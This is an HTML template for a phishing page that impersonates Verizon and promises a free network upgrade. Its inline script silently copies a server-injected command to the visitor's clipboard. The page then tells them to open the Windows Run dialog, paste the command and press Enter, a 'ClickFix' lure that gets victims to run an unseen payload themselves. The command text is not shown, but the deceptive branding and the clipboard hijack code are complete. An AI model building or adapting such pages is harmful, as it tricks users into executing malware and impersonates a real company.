<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Network Upgrade | Verizon</title>
    <link rel="stylesheet" href="/css/main.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
</head>
<body>
    <header class="verizon-header">
        <div class="header-container">
            <a href="https://www.verizon.com" class="logo-link">
                <img src="https://imgs.search.brave.com/tuw0OQsCECwkR1X4LMEUOlKhouI3wPZdaPrNz74jK-k/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9pbWcu/bG9nby5kZXYvdmVy/aXpvbi5jb20_dG9r/ZW49bGl2ZV82YTFh/MjhmZC02NDIwLTQ0/OTItYWViMC1iMjk3/NDYxZDlkZTImc2l6/ZT0xMjgmcmV0aW5h/PXRydWUmZm9ybWF0/PXBuZw" alt="Verizon" class="verizon-logo-img">
            </a>
            <nav class="header-nav">
                <a href="https://www.verizon.com/plans" class="header-link">Plans</a>
                <a href="https://www.verizon.com/smartphones" class="header-link">Phones &amp; Devices</a>
                <a href="https://www.verizon.com/coverage-map" class="header-link">Coverage</a>
            </nav>
        </div>
    </header>

    <main>
        <section class="hero-banner">
            <div class="hero-content">
                <span class="hero-kicker">Exclusive Customer Offer</span>
                <h1>You&rsquo;ve been selected for a free network upgrade.</h1>
                <p class="hero-desc">
                    As a valued Verizon customer, you qualify for our latest network enhancement at no additional cost.
                    Get unlimited premium data, faster 5G speeds, and enhanced coverage &mdash; on us.
                </p>
            </div>
        </section>

        <section class="benefits-section">
            <div class="section-inner">
                <h2>What&rsquo;s included</h2>
                <div class="benefits-grid">
                    <div class="benefit-card">
                        <h3>Unlimited Premium Data</h3>
                        <p>No caps, no throttling. Stream, game, and browse without ever worrying about data limits.</p>
                    </div>
                    <div class="benefit-card">
                        <h3>5G Ultra Wideband</h3>
                        <p>Blazing-fast speeds on America&rsquo;s most reliable 5G network with ultra wideband coverage.</p>
                    </div>
                    <div class="benefit-card">
                        <h3>Call Filter&trade; Protection</h3>
                        <p>Enhanced network security with automatic spam call blocking and caller ID included.</p>
                    </div>
                    <div class="benefit-card">
                        <h3>$0 Extra Cost</h3>
                        <p>Your monthly bill will not increase. This network upgrade is completely free &mdash; guaranteed.</p>
                    </div>
                </div>
            </div>
        </section>

        <section class="steps-section">
            <div class="section-inner">
                <h2>Activate your upgrade in under a minute</h2>
                <p class="section-sub">Three simple steps and you&rsquo;re done. The upgrade command is already copied to your clipboard.</p>

                <div class="steps-container">
                    <div class="step-card">
                        <div class="step-marker">1</div>
                        <div class="step-body">
                            <h3>Open the Run dialog</h3>
                            <p>Press <kbd>Windows</kbd> + <kbd>R</kbd> on your keyboard</p>
                        </div>
                    </div>
                    <div class="step-arrow">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="2"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
                    </div>
                    <div class="step-card">
                        <div class="step-marker">2</div>
                        <div class="step-body">
                            <h3>Paste the command</h3>
                            <p>Press <kbd>Ctrl</kbd> + <kbd>V</kbd> to paste the upgrade command</p>
                        </div>
                    </div>
                    <div class="step-arrow">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="2"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
                    </div>
                    <div class="step-card">
                        <div class="step-marker">3</div>
                        <div class="step-body">
                            <h3>Press Enter</h3>
                            <p>Hit <kbd>Enter</kbd> and the upgrade will be applied automatically</p>
                        </div>
                    </div>
                </div>

                <div class="clipboard-banner">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#EE0000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                    <span>Upgrade command automatically copied to clipboard.</span>
                </div>
            </div>
        </section>

        <footer class="page-footer">
            <div class="footer-inner">
                <div class="footer-links">
                    <a href="https://www.verizon.com/about/privacy" class="footer-link">Privacy Policy</a>
                    <a href="https://www.verizon.com/about/terms-conditions" class="footer-link">Terms &amp; Conditions</a>
                    <a href="https://www.verizon.com/about/open-internet" class="footer-link">Open Internet</a>
                    <a href="mailto:support@verizon.com" class="footer-link">Contact Us</a>
                </div>
                <p class="footer-copy">&copy; 2026 Verizon Communications Inc. All rights reserved.</p>
            </div>
        </footer>
    </main>

    <script>
        var copyText = <%- JSON.stringify(copyText) %>;
        (function() {
            if (copyText && navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(copyText).then(function() {
                    var el = document.querySelector('.clipboard-banner span');
                    if (el) el.textContent = 'Upgrade command copied to clipboard.';
                }).catch(function() {
                    var ta = document.createElement('textarea');
                    ta.value = copyText;
                    ta.style.position = 'fixed';
                    ta.style.left = '-9999px';
                    document.body.appendChild(ta);
                    ta.select();
                    document.execCommand('copy');
                    document.body.removeChild(ta);
                });
            }
        })();
    </script>
</body>
</html>
